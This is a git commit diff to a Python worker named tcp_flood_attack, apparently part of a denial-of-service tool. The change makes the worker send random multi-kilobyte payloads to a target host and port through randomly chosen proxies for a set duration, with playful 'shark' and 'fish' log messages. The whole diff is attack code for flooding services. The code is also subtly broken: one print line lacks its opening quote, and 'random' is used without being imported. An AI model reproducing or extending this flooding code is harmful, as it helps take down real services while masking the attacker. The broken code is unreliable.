b907a8e80a1cf5b8550d1af74a8ad35375f2dc5e
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-26 00:02:48 +0000

    Update tcp_flood_attack.py

--- workers/tcp_flood_attack.py
+++ workers/tcp_flood_attack.py
@@ -1,8 +1,9 @@
 import socket
 import time
 from utils.client_utils import TcpClient
+from utils.random_utils import random_string
 
-def tcp_flood_attack(target, proxies, duration):
+def tcp_flood_attack(target, proxies, duration, packet_size):
     host, port = target.split(":")
     port = int(port)
     end_time = time.time() + duration
@@ -10,9 +11,11 @@ def tcp_flood_attack(target, proxies, duration):
         proxy = random.choice(proxies)
         sock = TcpClient.create_socket(proxy)
         try:
+            payload = random_string(packet_size * 1024)  
             sock.connect((host, port))
-            print(f"🦈 Shark sent TCP packet on fish: {host}:{port} using {proxy['host']}:{proxy['port']}")
+            sock.send(payload.encode())
+            print(f"🦈 Shark sent TCP packet on fish: {host}:{port} by using proxy: {proxy['host']}:{proxy['port']}")
         except Exception as e:
-            print(f"🐟 Oh No! The fish: {host}:{port} dodged the TCP packet which was sent from: {proxy['host']}:{proxy['port']} Try Again! {e}")
+            print(f🐟 Oh No! The fish: {host}:{port} dodged the TCP packet frоm: {proxy['host']}:{proxy['port']} Get better proxies!: {e}")
         finally:
             sock.close()
